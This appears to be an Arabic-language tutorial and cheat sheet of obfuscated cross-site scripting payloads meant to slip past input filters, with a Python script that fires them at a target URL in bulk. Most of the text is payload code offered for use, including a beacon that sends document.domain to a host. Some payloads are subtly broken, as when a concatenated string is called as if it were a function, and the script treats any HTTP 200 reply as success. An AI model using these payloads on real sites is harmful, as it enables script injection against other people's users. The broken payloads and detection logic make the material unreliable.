
## الخطوات العملية للحقن المعقدة
1. **إعداد البيئة**:
   - استخدم متصفحًا مع أداة وكيل (مثل **Burp Suite** أو **OWASP ZAP**) لمراقبة وتعديل الطلبات.
   - حدد حقل إدخال يُحتمل أن يكون عرضة لـ XSS (مثل حقل البحث، نموذج التعليقات، أو معلمة URL).
   - افتح أدوات المطورين في المتصفح (F12) لمراقبة وحدة التحكم (Console) والتغييرات في الـ DOM.

2. **اختبار حقنة أساسية لتحديد الفلاتر**:
   - أدخل حقنة بسيطة مثل `<script>alert('XSS')</script>` أو `<img src=x onerror=alert(1)>`.
   - راقب الاستجابة:
     - إذا فشلت (مثل خطأ أو لا استجابة)، فهناك فلتر يحظر `<script>` أو `alert`.
     - إذا نجحت جزئيًا (مثل تنبيه أو تسجيل)، انتقل إلى الحقن المعقدة لتجنب القيود.
   - جرب صيغًا مختلفة (مثل `<SCRIPT>` أو `ALERT`) لفهم قواعد الفلتر.

3. **إدخال الحقن المعقدة**:
   - ابدأ بحقن معقدة بسيطة (مثل `<script>('al'+'ert')('XSS')</script>` أو `<script>\u0061lert('XSS')</script>`).
   - جرب الحقن في سياقات مختلفة:
     - معلمات URL: `https://example.com/search?query=<script>('al'+'ert')('XSS')</script>`
     - حقول نماذج: أدخل `<img src=x onerror=window['alert']('XSS')>` في حقل تعليق.
     - سمات HTML: `<input value="><script>eval('al'+'ert')('XSS')</script>">`.
   - استخدم تقنيات التعقيد مثل التشفير، تقسيم الكلمات، أو دوال بديلة.

4. **مراقبة الاستجابات**:
   - تحقق من نجاح الحقن بناءً على:
     - **نجاح (True)**: ظهور تنبيه، تسجيل رسالة في وحدة التحكم (مثل `console.log('XSS')`)، تغيير عنوان الصفحة، أو تغيير لون الخلفية.
     - **فشل (False)**: لا يحدث شيء، ظهور خطأ (مثل رمز حالة 403)، أو تصفية الإدخال.
   - قارن الاستجابات (مثل طول الصفحة، نص معين، أو رمز الحالة) لتأكيد التنفيذ.

5. **تعديل الحقن وتكرار العملية**:
   - إذا فشلت الحقن، عدّلها باستخدام تقنيات تعقيد مختلفة (مثل تشفير Base64، استخدام `Function`، أو تداخل الوسوم).
   - جرب سياقات إدخال مختلفة (مثل وسوم HTML5 مثل `<svg>` أو أحداث مثل `onload`).
   - استخدم أدوات مثل Burp Suite Repeater لتجربة الحقن بشكل منهجي.

6. **أتمتة العملية (اختياري)**:
   - إذا كان الاختبار اليدوي بطيئًا، استخدم سكربت (مثل Python مع مكتبة `requests`) لإرسال الحقن تلقائيًا وتحليل الاستجابات.
   - ركز على اختبار مجموعة من الحقن المعقدة (مثل قائمة تشفير يونيكود أو هيكس) لتحديد أي صيغة تنجح.



---

## جميع المحاولات الممكنة للحقن المعقدة
في الحقن المعقدة، المحاولات تعتمد على إنشاء شيفرات JavaScript بصيغ غامضة لتجاوز فلاتر الحماية. سأقسم المحاولات إلى فئتين:
1. **الحقن اليدوية**: للاختبار اليدوي باستخدام Burp Suite أو حقول الإدخال.
2. **الحقن للأتمتة**: للاستخدام مع سكربتات أو أدوات آلية.

### 1. الحقن اليدوية
تُستخدم هذه الحقن عند اختبار الثغرة يدويًا عبر حقل إدخال (مثل البحث أو التعليقات) أو باستخدام Burp Suite Repeater. الهدف هو تنفيذ شيفرة JavaScript بطريقة تخدع الفلاتر.

#### أ. تقسيم الكلمات
{ #XSS_Obfuscation_payloads }
اختبار تقسيم الكلمات الحساسة (مثل `alert`, `confirm`) لتجنب فلاتر الكلمات المفتاحية.
- **الحقن**: `<script>('al'+'ert')('XSS')</script>`
  - **الإدخال**: أدخل في حقل بحث أو تعليق: `<script>('al'+'ert')('XSS')</script>`
  - **كيف يعمل**: يقسم `alert` إلى `'al'+'ert'`، مما يجعلها غير متطابقة مع فلاتر تحظر `alert`.
  - **متى يُستخدم؟**: عندما تحظر الفلاتر الكلمات الكاملة مثل `alert`.
- **الحقن**: `<script>window['al'+'ert']('XSS')</script>`
  - **الإدخال**: `https://example.com/search?query=<script>window['al'+'ert']('XSS')</script>`
  - **كيف يعمل**: يستخدم الوصول إلى خاصية `alert` عبر `window` مع تقسيم الكلمة.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر `alert` ولكن تسمح بالوصول إلى خصائص الكائن.
- **الحقن**: `<script>eval('al'+'ert')('XSS')</script>`
  - **الإدخال**: أدخل في نموذج: `<script>eval('al'+'ert')('XSS')</script>`
  - **كيف يعمل**: يستخدم `eval` لتجميع وتنفيذ `alert`.
  - **متى يُستخدم؟**: عندما تسمح الفلاتر بـ `eval` ولكن تحظر `alert`.
- **الحقن**: `<script>window['a'+'l'+'e'+'r'+'t']('XSS')</script>`
  - **الإدخال**: أدخل في حقل: `<script>window['a'+'l'+'e'+'r'+'t']('XSS')</script>`
  - **كيف يعمل**: يقسم `alert` إلى حروف فردية لتعقيد أكبر.
  - **متى يُستخدم؟**: لتجاوز فلاتر متقدمة تحلل الكلمات.
- **الحقن**: `<script>('con'+'firm')('XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>('con'+'firm')('XSS')</script>`
  - **كيف يعمل**: يقسم `confirm` لتجنب فلاتر نافذة التأكيد.
  - **متى يُستخدم؟**: لاختبار بدائل `alert`.
- **الحقن**: `<script>eval('prom'+'pt')('أدخل:','XSS')</script>`
  - **الإدخال**: أدخل في حقل: `<script>eval('prom'+'pt')('أدخل:','XSS')</script>`
  - **كيف يعمل**: يقسم `prompt` لاختبار نافذة الإدخال.
  - **متى يُستخدم؟**: لمحاكاة تفاعل المستخدم.

#### ب. التشفير
{  #XSS_ecoded_payload }
اختبار الشيفرات المشفرة باستخدام يونيكود، هيكس، أو ASCII لإخفاء الكلمات الحساسة.
- **الحقن**: `<script>\u0061lert('XSS')</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>\u0061lert('XSS')</script>`
  - **كيف يعمل**: يشفر حرف `a` بيونيكود (\u0061 = a) لتجنب فلاتر `alert`.
  - **متى يُستخدم؟**: عندما تحظر الفلاتر النصوص العادية ولكن تسمح باليونيكود.
- **الحقن**: `<script>eval('\x61lert(\'XSS\')')</script>`
  - **الإدخال**: أدخل في نموذج: `<script>eval('\x61lert(\'XSS\')')</script>`
  - **كيف يعمل**: يشفر `a` بصيغة هيكس (\x61 = a).
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر النصوص ولكن تسمح بالهيكس.
- **الحقن**: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **الإدخال**: أدخل في تعليق: `<script>alert(String.fromCharCode(88,83,83))</script>`
  - **كيف يعمل**: يشفر "XSS" بقيم ASCII (88=X، 83=S).
  - **متى يُستخدم؟**: لإخفاء النصوص داخل التنبيهات.
- **الحقن**: `<script>alert('\x58\x53\x53')</script>`
  - **الإدخال**: أدخل في حقل: `<script>alert('\x58\x53\x53')</script>`
  - **كيف يعمل**: يشفر "XSS" بصيغة هيكس.
  - **متى يُستخدم؟**: لتجاوز فلاتر النصوص العادية.
- **الحقن**: `<script>alert('\u0058\u0053\u0053')</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>alert('\u0058\u0053\u0053')</script>`
  - **كيف يعمل**: يشفر "XSS" بيونيكود.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر النصوص العادية.
- **الحقن**: `<script>eval('\u0061\u006c\u0065\u0072\u0074')('XSS')</script>`
  - **الإدخال**: أدخل في نموذج: `<script>eval('\u0061\u006c\u0065\u0072\u0074')('XSS')</script>`
  - **كيف يعمل**: يشفر `alert` بالكامل بيونيكود.
  - **متى يُستخدم؟**: لتجاوز فلاتر متقدمة.
- **الحقن**: `<script>String.fromCharCode(97,108,101,114,116)('XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>String.fromCharCode(97,108,101,114,116)('XSS')</script>`
  - **كيف يعمل**: يشفر `alert` بقيم ASCII.
  - **متى يُستخدم؟**: لإخفاء الكلمات الحساسة.

#### ج. دوال بديلة
{ #XSS_Obfuscation_payloads / #XSS_with_out_alret }
استخدام دوال JavaScript غير شائعة بدلاً من `alert` أو `eval`.
- **الحقن**: `<script>Function('alert("XSS")')()</script>`
  - **الإدخال**: أدخل في حقل: `<script>Function('alert("XSS")')()</script>`
  - **كيف يعمل**: يستخدم باني `Function` لتنفيذ شيفرة ديناميكية.
  - **متى يُستخدم؟**: عندما تحظر الفلاتر `alert` ولكن تسمح بـ `Function`.
- **الحقن**: `<script>new Function('alert("XSS")')()</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>new Function('alert("XSS")')()</script>`
  - **كيف يعمل**: صيغة مشابهة لـ `Function`.
  - **متى يُستخدم؟**: لتجاوز فلاتر تحظر الصيغ القياسية.
- **الحقن**: `<script>(window['Function'])('alert("XSS")')()</script>`
  - **الإدخال**: أدخل في نموذج: `<script>(window['Function'])('alert("XSS")')()</script>`
  - **كيف يعمل**: يصل إلى `Function` عبر `window`.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر `Function` مباشرة.
- **الحقن**: `<script>setTimeout('alert("XSS")')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>setTimeout('alert("XSS")')</script>`
  - **كيف يعمل**: ينفذ الشيفرة بعد تأخير.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر التنفيذ المباشر.
- **الحقن**: `<script>setInterval('alert("XSS")',1000)</script>`
  - **الإدخال**: أدخل في حقل: `<script>setInterval('alert("XSS")',1000)</script>`
  - **كيف يعمل**: ينفذ الشيفرة بشكل متكرر.
  - **متى يُستخدم؟**: لاختبار التكرار.
- **الحقن**: `<script>Object.getOwnPropertyDescriptor(window,'alert').value('XSS')</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>Object.getOwnPropertyDescriptor(window,'alert').value('XSS')</script>`
  - **كيف يعمل**: يصل إلى `alert` عبر خصائص الكائن.
  - **متى يُستخدم؟**: لتجاوز فلاتر متقدمة.

#### د. تداخل الوسوم
{ #XSS_Idea_for_script_tag  }
إضافة وسوم أو أحرف مضللة لإرباك الفلاتر.
- **الحقن**: `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
  - **الإدخال**: أدخل في نموذج: `<scr<script>ipt>alert('XSS')</scr<script>ipt>`
  - **كيف يعمل**: يداخل `<script>` لتجاوز فلاتر تحظر الوسم.
  - **متى يُستخدم؟**: عندما تحظر الفلاتر `<script>` ولكن تسمح بالتداخل.
- **الحقن**: `<script>/*تعليق*/alert('XSS')/*تعليق*/</script>`
  - **الإدخال**: أدخل في تعليق: `<script>/*تعليق*/alert('XSS')/*تعليق*/</script>`
  - **كيف يعمل**: يضيف تعليقات لإرباك الفلاتر.
  - **متى يُستخدم؟**: لتجنب فلاتر تحلل النصوص.
- **الحقن**: `<script>alert('XSS')//تعليق</script>`
  - **الإدخال**: أدخل في حقل: `<script>alert('XSS')//تعليق</script>`
  - **كيف يعمل**: يستخدم تعليق متتالي لإخفاء النهاية.
  - **متى يُستخدم؟**: لتجنب فلاتر تحلل النهاية.
- **الحقن**: `<script>a=alert,a('XSS')</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>a=alert,a('XSS')</script>`
  - **كيف يعمل**: يعين `alert` لمتغير لتقليل الكلمات الحساسة.
  - **متى يُستخدم؟**: لتجنب فلاتر الكلمات.
- **الحقن**: `<script>alert`XSS`</script>`
  - **الإدخال**: أدخل في نموذج: `<script>alert`XSS`</script>`
  - **كيف يعمل**: يستخدم علامات اقتباس خلفية للتشويش.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر الصيغ القياسية.

#### هـ. الحالات والصيغ
{ #XSS_Idea_for_script_tag / #XSS--ALL--Event--Payload  }
تغيير حالة الأحرف أو صيغة الوسوم.
- **الحقن**: `<SCRIPT>alert('XSS')</SCRIPT>`
  - **الإدخال**: أدخل في تعليق: `<SCRIPT>alert('XSS')</SCRIPT>`
  - **كيف يعمل**: حروف كبيرة لتجاوز فلاتر حساسة لحالة الأحرف.
  - **متى يُستخدم؟**: عندما تكون الفلاتر حساسة للحالة.
- **الحقن**: `<sCrIpT>alert('XSS')</sCrIpT>`
  - **الإدخال**: أدخل في حقل: `<sCrIpT>alert('XSS')</sCrIpT>`
  - **كيف يعمل**: حالات مختلطة لتعقيد إضافي.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر صيغًا محددة.
- **الحقن**: `<script type="text/javascript">alert('XSS')</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script type="text/javascript">alert('XSS')</script>`
  - **كيف يعمل**: يحدد نوع النص صراحة.
  - **متى يُستخدم؟**: لتجنب فلاتر تتجاهل الوسوم غير المحددة.
- **الحقن**: `<script language="javascript">alert('XSS')</script>`
  - **الإدخال**: أدخل في نموذج: `<script language="javascript">alert('XSS')</script>`
  - **كيف يعمل**: يستخدم سمة `language` القديمة.
  - **متى يُستخدم؟**: لتجنب فلاتر حديثة.
- **الحقن**: `<ScRiPt>AlErT('XSS')</ScRiPt>`
  - **الإدخال**: أدخل في تعليق: `<ScRiPt>AlErT('XSS')</ScRiPt>`
  - **كيف يعمل**: يمزج الحالات في الوسم والدالة.
  - **متى يُستخدم؟**: لتجاوز فلاتر حساسة للحالة.

#### و. مصادر خارجية
{ #XSS_Idea_for_script_tag }
استخدام مصادر JavaScript معقدة.
- **الحقن**: `<script src=javascript:alert('XSS')></script>`
  - **الإدخال**: أدخل في حقل: `<script src=javascript:alert('XSS')></script>`
  - **كيف يعمل**: يستخدم عنوان `javascript:` كمصدر.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر الشيفرة المباشرة.
- **الحقن**: `<script src=data:,alert('XSS')></script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script src=data:,alert('XSS')></script>`
  - **كيف يعمل**: يستخدم عنوان بيانات (data URI).
  - **متى يُستخدم؟**: لتجنب فلاتر URLs.
- **الحقن**: `<script src="data:text/javascript,alert('XSS')"></script>`
  - **الإدخال**: أدخل في نموذج: `<script src="data:text/javascript,alert('XSS')"></script>`
  - **كيف يعمل**: صيغة أخرى لعنوان البيانات.
  - **متى يُستخدم؟**: لتجنب فلاتر صارمة.
- **الحقن**: `<script src="data:;base64,YWxlcnQoIlhTUyIp"></script>`
  - **الإدخال**: أدخل في تعليق: `<script src="data:;base64,YWxlcnQoIlhTUyIp"></script>`
  - **كيف يعمل**: يشفر `alert("XSS")` بـ Base64.
  - **متى يُستخدم؟**: لتجاوز فلاتر URLs المشفرة.
- **الحقن**: `<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>`
  - **الإدخال**: أدخل في حقل: `<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>`
  - **كيف يعمل**: يستخدم Base64 مع فك التشفير عبر `atob`.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر الشيفرة العادية.

#### ز. أحداث معقدة
{ #XSS_Idea_for_Img_tag / #XSS--ALL--Event--Payload  }
استخدام سمات الأحداث مع شيفرة معقدة.
- **الحقن**: `<img src=x onerror=('al'+'ert')('XSS')>`
  - **الإدخال**: أدخل في تعليق: `<img src=x onerror=('al'+'ert')('XSS')>`
  - **كيف يعمل**: يقسم `alert` في حدث `onerror`.
  - **متى يُستخدم؟**: لتجنب فلاتر الأحداث.
- **الحقن**: `<img src=x onerror=window['alert']('XSS')>`
  - **الإدخال**: أدخل في حقل: `<img src=x onerror=window['alert']('XSS')>`
  - **كيف يعمل**: يستخدم `window['alert']` في حدث `onerror`.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر `alert`.
- **الحقن**: `<img src=x onerror=Function('alert("XSS")')()>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<img src=x onerror=Function('alert("XSS")')()>`
  - **كيف يعمل**: يستخدم `Function` في حدث `onerror`.
  - **متى يُستخدم؟**: لتجنب فلاتر الأحداث القياسية.
- **الحقن**: `<svg onload=('con'+'firm')('XSS')>`
  - **الإدخال**: أدخل في نموذج: `<svg onload=('con'+'firm')('XSS')>`
  - **كيف يعمل**: يقسم `confirm` في حدث `onload`.
  - **متى يُستخدم؟**: لاختبار وسوم HTML5.
- **الحقن**: `<input autofocus onfocus=eval('al'+'ert')('XSS')>`
  - **الإدخال**: أدخل في تعليق: `<input autofocus onfocus=eval('al'+'ert')('XSS')>`
  - **كيف يعمل**: يستخدم تقسيم `alert` في حدث `onfocus`.
  - **متى يُستخدم؟**: لتجنب فلاتر حقول الإدخال.

#### ح. وسوم HTML5 معقدة
{ #XSS_Idea_for_SVG_tag / #XSS_with_out_alret   /  #XSS_unique_tags}
استغلال وسوم HTML5 مع شيفرة معقدة.
- **الحقن**: `<svg onload=window['alert']('XSS')>`
  - **الإدخال**: أدخل في حقل: `<svg onload=window['alert']('XSS')>`
  - **كيف يعمل**: يستخدم `window['alert']` في وسم SVG.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر `<script>`.
- **الحقن**: `<svg><script>('al'+'ert')('XSS')</script></svg>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<svg><script>('al'+'ert')('XSS')</script></svg>`
  - **كيف يعمل**: يقسم `alert` داخل SVG.
  - **متى يُستخدم؟**: لاختبار وسوم HTML5.
- **الحقن**: `<details open ontoggle=Function('alert("XSS")')()>`
  - **الإدخال**: أدخل في نموذج: `<details open ontoggle=Function('alert("XSS")')()>`
  - **كيف يعمل**: يستخدم `Function` في حدث `ontoggle`.
  - **متى يُستخدم؟**: لتجنب فلاتر الأحداث.
- **الحقن**: `<meter value=2 min=0 max=10 onmouseover=('al'+'ert')('XSS')>2/10</meter>`
  - **الإدخال**: أدخل في تعليق: `<meter value=2 min=0 max=10 onmouseover=('al'+'ert')('XSS')>2/10</meter>`
  - **كيف يعمل**: يقسم `alert` في حدث `onmouseover`.
  - **متى يُستخدم؟**: لاختبار وسوم HTML5 غير شائعة.
- **الحقن**: `<video><source onerror=eval('al'+'ert')('XSS')></video>`
  - **الإدخال**: أدخل في حقل: `<video><source onerror=eval('al'+'ert')('XSS')></video>`
  - **كيف يعمل**: يستخدم تقسيم `alert` في حدث `onerror`.
  - **متى يُستخدم؟**: لتجنب فلاتر وسوم الفيديو.

#### ط. JavaScript URIs معقدة
{ #ideas_for_url }
تعقيد عناوين `javascript:` لتجاوز فلاتر URLs.
- **الحقن**: `javascript:('al'+'ert')('XSS')`
  - **الإدخال**: أدخل في رابط: `<a href="javascript:('al'+'ert')('XSS')">اضغط</a>`
  - **كيف يعمل**: يقسم `alert` في عنوان `javascript:`.
  - **متى يُستخدم؟**: لتجنب فلاتر URLs.
- **الحقن**: `javascript://%0Awindow['alert']('XSS')`
  - **الإدخال**: أدخل في حقل: `<a href="javascript://%0Awindow['alert']('XSS')">اضغط</a>`
  - **كيف يعمل**: يستخدم سطر جديد مع `window['alert']`.
  - **متى يُستخدم؟**: لتجنب فلاتر صارمة.
- **الحقن**: `javascript:\u0061lert('XSS')`
  - **الإدخال**: أدخل في رابط: `<a href="javascript:\u0061lert('XSS')">اضغط</a>`
  - **كيف يعمل**: يشفر `a` بيونيكود.
  - **متى يُستخدم؟**: لتجنب فلاتر النصوص.
- **الحقن**: `javascript:eval('\x61lert(\'XSS\')')`
  - **الإدخال**: أدخل في حقل: `<a href="javascript:eval('\x61lert(\'XSS\')')">اضغط</a>`
  - **كيف يعمل**: يشفر `a` بصيغة هيكس.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر النصوص.
- **الحقن**: `javascript:Function('alert("XSS")')()`
  - **الإدخال**: أدخل في رابط: `<a href="javascript:Function('alert("XSS")')()">اضغط</a>`
  - **كيف يعمل**: يستخدم `Function` في عنوان `javascript:`.
  - **متى يُستخدم؟**: لتجنب فلاتر URLs القياسية.
- **الحقن**: `data:text/html;base64,PHNjcmlwdD4oJ2FsJysnZXJ0JikoJ1hTUycpPC9zY3JpcHQ+`
  - **الإدخال**: أدخل في حقل: `<a href="data:text/html;base64,PHNjcmlwdD4oJ2FsJysnZXJ0JikoJ1hTUycpPC9zY3JpcHQ+">اضغط</a>`
  - **كيف يعمل**: يشفر `<script>('al'+'ert')('XSS')</script>` بـ Base64.
  - **متى يُستخدم؟**: لتجنب فلاتر URLs المشفرة.

#### ي. حقن بدون تنبيهات
{ #XSS_with_out_alret / }
تأكيد التنفيذ بدون تنبيهات باستخدام شيفرة معقدة.
- **الحقن**: `<script>console['log']('XSS')</script>`
  - **الإدخال**: أدخل في تعليق: `<script>console['log']('XSS')</script>`
  - **كيف يعمل**: يستخدم `console['log']` بدلاً من `console.log`.
  - **متى يُستخدم؟**: لتجنب فلاتر تحظر التنبيهات.
- **الحقن**: `<script>('cons'+'ole')['log']('XSS: ' + document.domain)</script>`
  - **الإدخال**: أدخل في حقل: `<script>('cons'+'ole')['log']('XSS: ' + document.domain)</script>`
  - **كيف يعمل**: يقسم `console` ويستخدم `log`.
  - **متى يُستخدم؟**: لتجنب فلاتر متقدمة.
- **الحقن**: `<script>new Image().src='http://localhost/log?c='+document['domain']</script>`
  - **الإدخال**: أدخل في URL: `https://example.com/search?query=<script>new Image().src='http://localhost/log?c='+document['domain']</script>`
  - **كيف يعمل**: يرسل النطاق باستخدام `document['domain']`.
  - **متى يُستخدم؟**: لتأكيد التنفيذ دون تنبيهات.
- **الحقن**: `<script>document['title']='XSS'</script>`
  - **الإدخال**: أدخل في نموذج: `<script>document['title']='XSS'</script>`
  - **كيف يعمل**: يغير العنوان باستخدام `document['title']`.
  - **متى يُستخدم؟**: لتأكيد التنفيذ بصريًا.
- **الحقن**: `<script>document['body']['style']['background']='red'</script>`
  - **الإدخال**: أدخل في تعليق: `<script>document['body']['style']['background']='red'</script>`
  - **كيف يعمل**: يغير لون الخلفية عبر سلسلة خصائص.
  - **متى يُستخدم؟**: لتأكيد التنفيذ بتغيير بصري.

### 2. الحقن للأتمتة
تُستخدم هذه الحقن مع سكربتات (مثل Python مع مكتبة `requests`) لأتمتة اختبار مجموعة من الحقن المعقدة وتحليل الاستجابات. الهدف هو تسريع العملية عند وجود فلاتر متعددة.

#### أ. إعداد قائمة الحقن
- **المحاولات**:
  - إنشاء قائمة بالحقن المعقدة (مثل تلك في القسم اليدوي).
  - مثال قائمة:
    ```
    <script>('al'+'ert')('XSS')</script>
    <script>\u0061lert('XSS')</script>
    <script>eval('\x61lert(\'XSS\')')</script>
    <img src=x onerror=('al'+'ert')('XSS')>
    <svg onload=window['alert']('XSS')>
    javascript:Function('alert("XSS")')()
    ```
- **كيف يعمل**:
  - يتم إرسال كل حقنة على حدة باستخدام طلب HTTP (GET أو POST).
  - يتم تحليل الاستجابة (مثل رمز الحالة، طول الصفحة، أو نص معين) لتحديد النجاح.
- **متى يُستخدم؟**:
  - عند الحاجة لاختبار عدد كبير من الحقن بسرعة.

#### ب. سكربت أتمتة بسيط
- **السكربت** (مثال بلغة Python):
  ```python
  import requests

  url = "https://example.com/search?query="
  payloads = [
      "<script>('al'+'ert')('XSS')</script>",
      "<script>\u0061lert('XSS')</script>",
      "<script>eval('\x61lert(\\'XSS\\'))</script>",
      "<img src=x onerror=('al'+'ert')('XSS')>",
      "<svg onload=window['alert']('XSS')>",
      "javascript:Function('alert(\"XSS\")')()"
  ]

  for payload in payloads:
      response = requests.get(url + payload)
      if "XSS" in response.text or response.status_code == 200:
          print(f"نجاح: {payload}")
      else:
          print(f"فشل: {payload}")
  ```
- **كيف يعمل**:
  - يرسل كل حقنة إلى URL المستهدف.
  - يتحقق من وجود كلمة "XSS" في الاستجابة أو رمز حالة 200 لتأكيد النجاح.
- **متى يُستخدم؟**:
  - عند اختبار نقاط إدخال متعددة أو فلاتر معقدة.

#### ج. تحليل الاستجابات
- **المحاولات**:
  - قارن استجابات الحقن بناءً على:
    - **رمز الحالة**: 200 (نجاح) مقابل 403/404 (فشل).
    - **طول الصفحة**: صفحة أطول قد تشير إلى نجاح.
    - **نص معين**: مثل "XSS" أو "error" في الاستجابة.
  - مثال: إذا أعادت `<script>('al'+'ert')('XSS')</script>` صفحة تحتوي على "XSS"، فهي ناجحة.
- **كيف يعمل**:
  - يتم تسجيل الاستجابات لتحديد أي حقنة تجاوزت الفلاتر.
- **متى يُستخدم؟**:
  - لتحديد الحقن الأكثر فعالية بسرعة.

#### د. توسيع قائمة الحقن
- **المحاولات**:
  - أضف تشفيرات إضافية (مثل Base64 لشيفرات جديدة).
  - جرب وسوم HTML5 أخرى (مثل `<audio>`, `<marquee>`).
  - استخدم أحداث إضافية (مثل `onpointerover`, `onloadstart`).
- **كيف يعمل**:
  - يتم إنشاء قائمة موسعة تشمل كل المتغيرات الممكنة.
  - مثال: إضافة `<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>` إلى القائمة.
- **متى يُستخدم؟**:
  - عندما تكون الفلاتر صارمة وتتطلب تجربة صيغ متعددة.

---



1. تقسيم الكلمات:
- <script>('al'+'ert')('XSS')</script>: يقسم alert إلى جزأين لتجاوز فلاتر الكلمات.
- <script>window['al'+'ert']('XSS')</script>: يستخدم خاصية الكائن مع تقسيم alert.
- <script>eval('al'+'ert')('XSS')</script>: يجمع alert عبر eval.
- <script>window['a'+'l'+'e'+'r'+'t']('XSS')</script>: يقسم alert إلى حروف.
- <script>('con'+'firm')('XSS')</script>: يقسم confirm لتجنب فلاتر التأكيد.
- <script>eval('prom'+'pt')('أدخل:','XSS')</script>: يقسم prompt لنافذة الإدخال.

2. التشفير:
- <script>\u0061lert('XSS')</script>: يشفر a بيونيكود (\u0061 = a).
- <script>eval('\x61lert(\'XSS\')')</script>: يشفر a بصيغة هيكس (\x61 = a).
- <script>alert(String.fromCharCode(88,83,83))</script>: يشفر XSS بـ ASCII (88=X، 83=S).
- <script>alert('\x58\x53\x53')</script>: يشفر XSS بصيغة هيكس.
- <script>alert('\u0058\u0053\u0053')</script>: يشفر XSS بيونيكود.
- <script>eval('\u0061\u006c\u0065\u0072\u0074')('XSS')</script>: يشفر alert بيونيكود.
- <script>String.fromCharCode(97,108,101,114,116)('XSS')</script>: يشفر alert بـ ASCII.

3. دوال بديلة:
- <script>Function('alert("XSS")')()</script>: يستخدم باني Function.
- <script>new Function('alert("XSS")')()</script>: صيغة مشابهة لـ Function.
- <script>(window['Function'])('alert("XSS")')()</script>: يصل إلى Function عبر window.
- <script>setTimeout('alert("XSS")')</script>: ينفذ بعد تأخير.
- <script>setInterval('alert("XSS")',1000)</script>: ينفذ بشكل متكرر.
- <script>Object.getOwnPropertyDescriptor(window,'alert').value('XSS')</script>: يصل إلى alert عبر الخصائص.

4. تداخل الوسوم:
- <scr<script>ipt>alert('XSS')</scr<script>ipt>: يداخل <script> لتجاوز فلاتر الوسم.
- <script>/*تعليق*/alert('XSS')/*تعليق*/</script>: يضيف تعليقات للإرباك.
- <script>alert('XSS')//تعليق</script>: يستخدم تعليق متتالي.
- <script>a=alert,a('XSS')</script>: يعين alert لمتغير.
- <script>alert`XSS`</script>: يستخدم علامات اقتباس خلفية.

5. الحالات والصيغ:
- <SCRIPT>alert('XSS')</SCRIPT>: حروف كبيرة لتجاوز فلاتر الحالة.
- <sCrIpT>alert('XSS')</sCrIpT>: حالات مختلطة.
- <script type="text/javascript">alert('XSS')</script>: يحدد نوع النص.
- <script language="javascript">alert('XSS')</script>: يستخدم سمة language.
- <ScRiPt>AlErT('XSS')</ScRiPt>: يمزج الحالات.

6. مصادر خارجية:
- <script src=javascript:alert('XSS')></script>: يستخدم عنوان javascript:.
- <script src=data:,alert('XSS')></script>: يستخدم عنوان بيانات.
- <script src="data:text/javascript,alert('XSS')"></script>: صيغة أخرى لعنوان البيانات.
- <script src="data:;base64,YWxlcnQoIlhTUyIp"></script>: يشفر alert("XSS") بـ Base64.
- <script>eval(atob('YWxlcnQoIlhTUyIp'))</script>: يستخدم Base64 مع atob.

7. أحداث معقدة:
- <img src=x onerror=('al'+'ert')('XSS')>: يقسم alert في onerror.
- <img src=x onerror=window['alert']('XSS')>: يستخدم window['alert'].
- <img src=x onerror=Function('alert("XSS")')()>: يستخدم Function.
- <svg onload=('con'+'firm')('XSS')>: يقسم confirm في onload.
- <input autofocus onfocus=eval('al'+'ert')('XSS')>: يستخدم تقسيم alert في onfocus.

8. وسوم HTML5 معقدة:
- <svg onload=window['alert']('XSS')>: يستخدم window['alert'] في SVG.
- <svg><script>('al'+'ert')('XSS')</script></svg>: يقسم alert داخل SVG.
- <details open ontoggle=Function('alert("XSS")')()>: يستخدم Function في ontoggle.
- <meter value=2 min=0 max=10 onmouseover=('al'+'ert')('XSS')>2/10</meter>: يقسم alert في onmouseover.
- <video><source onerror=eval('al'+'ert')('XSS')></video>: يستخدم تقسيم alert في onerror.

9. JavaScript URIs معقدة:
- javascript:('al'+'ert')('XSS'): يقسم alert في عنوان javascript:.
- javascript://%0Awindow['alert']('XSS'): يستخدم سطر جديد مع window['alert'].
- javascript:\u0061lert('XSS'): يشفر a بيونيكود.
- javascript:eval('\x61lert(\'XSS\')'): يشفر a بصيغة هيكس.
- javascript:Function('alert("XSS")')(): يستخدم Function.
- data:text/html;base64,PHNjcmlwdD4oJ2FsJysnZXJ0JikoJ1hTUycpPC9zY3JpcHQ+: يشفر <script>('al'+'ert')('XSS')</script> بـ Base64.

10. حقن بدون تنبيهات:
- <script>console['log']('XSS')</script>: يستخدم console['log'].
- <script>('cons'+'ole')['log']('XSS: ' + document.domain)</script>: يقسم console.
- <script>new Image().src='http://localhost/log?c='+document['domain']</script>: يرسل النطاق.
- <script>document['title']='XSS'</script>: يغير العنوان.
- <script>document['body']['style']['background']='red'</script>: يغير لون الخلفية.



---

**نصائح إضافية**:
- **تجاوز الفلاتر المتقدمة**: جرب دمج تقنيات (مثل `<noscript><img src=x onerror=('al'+'ert')('XSS')>`) أو اختبار عيوب الفلتر (مثل تجاهل التشفير).
